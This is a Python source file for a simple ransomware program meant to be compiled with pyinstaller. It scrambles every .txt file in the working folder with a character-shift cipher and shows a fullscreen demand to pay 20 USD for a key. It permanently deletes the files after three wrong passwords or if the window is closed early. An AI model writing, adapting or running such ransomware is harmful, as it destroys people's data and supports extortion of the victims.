# compile with pyinstaller --onefile main.py --windowed
import sys
import os
import time
import tkinter as tk
from tkinter import messagebox
import win32com
import win32api

txts = list()
for i in os.listdir():
    if i.endswith('.txt'):
        txts.append(i)


def encrypt():
    for i in txts:
        filer = open(i, 'r')
        st = str()
        for j in filer.read():
            st += chr(ord(j) + 2)
        filew = open(i, 'w')
        filew.write(st)


def decrypt():
    for i in txts:
        filer = open(i, 'r')
        st = str()
        for j in filer.read():
            st += chr(ord(j) - 2)
        filew = open(i, 'w')
        filew.write(st)


encrypt()
tries = 3
HASTRIED = False
clt = False
def checkpswd():
    global tries
    global bool
    global HASTRIED
    tries -= 1
    if tries >= 0:
        if entpsswd.get() == 'Ijey8*3h3*2h()@8fh' and tries > 0:
            HASTRIED = True
            decrypt()
            showtries.config(text='Success! Your files have been decrypted!')
            messagebox.showinfo("Success!", "Your files have been successfully decrypted!")
            sys.exit()
        else:
            if(tries > 0):
                showtries.config(text='Wrong password! You have ' + str(tries) + ' tries left')
            else:
                if entpsswd.get() == 'Ijey8*3h3*2h()@8fh':
                    decrypt()
                    HASTRIED = True
                    showtries.config(text='Success! Your files have been decrypted!')
                    messagebox.showinfo("Success!", "Your files have been successfully decrypted!")
                    exit(1)
                else:
                    HASTRIED = True
                    for i in txts:
                        os.remove(i)
                    showtries.config(text='You have 0 tries left. Your files are donzo.')
                    messagebox.showinfo('Files Deleted', 'Your files have been deleted. Say goodbye!')
                    sys.exit()



_window = tk.Tk()
_window.title('OOPS, YOUR FILES HAVE BEEN ENCRYPTED')
_window.attributes('-fullscreen', True)
_window.config(background='black')
lb = tk.Label(
    text='Oops, your files have been encrypted.\nPay 20 usd for your decryption key.\nYou Have 3 tries to input the correct key.\nAfter the 3 tries your files will be deleted.',
    font=('Cambodgia', 30),
    fg='red',
    bg='black')
lb.pack()
entpsswd = tk.Entry(bg='black',
                    fg='purple',
                    font=('Cambodgia', 32)
                    ,borderwidth=10)
entpsswd.pack(fill="none", expand=True)

win32api.Beep(300,600)
btn = tk.Button(text='Submit Password',
                borderwidth=5,
                font=('Cambodgia', 38),
                bg='black',
                fg='red',
                activebackground='black',
                activeforeground='purple',
                command=checkpswd)
btn.pack(side=tk.BOTTOM)
showtries = tk.Label(
font=('Cambodgia', 17),
bg='black',
fg='red'
)
showtries.pack(side=tk.BOTTOM)
_window.mainloop()
if HASTRIED == False:
        messagebox.showinfo('Files deleted', 'You have exited this program before using your 3 tries.')
        for i in txts:
            os.remove(i)
